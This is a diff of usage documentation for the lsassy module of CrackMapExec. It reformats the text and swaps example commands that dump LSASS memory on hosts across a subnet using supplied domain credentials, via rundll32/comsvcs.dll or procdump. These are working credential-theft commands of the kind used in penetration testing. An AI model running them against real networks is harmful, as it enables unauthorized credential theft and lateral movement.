@@ -47,18 +47,18 @@ cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy
 
 ### Advanced
 
-By default, this module uses rundll32.exe with comsvcs.dll DLL to dump lsass process on the remote host, with method "1" of lsassy.
+By default, this module uses `rundll32.exe` with `comsvcs.dll` DLL to dump lsass process on the remote host, with method **1** of lsassy.
 
 If you want to specify the dumping method, use the `METHOD` option (`lsassy -h` for more details)
 
 ```bash
-cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o METHOD=2 PROCDUMP_PATH=/opt/Sysinternals/procdump.exe
+cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o METHOD=3
 ```
 
 If you're using a method that requires procdump, you can specify procdump location with `PROCDUMP_PATH` option.
 
 ```bash
-cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o METHOD=3 PROCDUMP_PATH=/opt/Sysinternals/procdump.exe
+cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o METHOD=2 PROCDUMP_PATH=/opt/Sysinternals/procdump.exe
 ```
 
 By default, lsass dump name is randomly generated. If you want to specify a dump name, you can use `REMOTE_LSASS_DUMP` option.
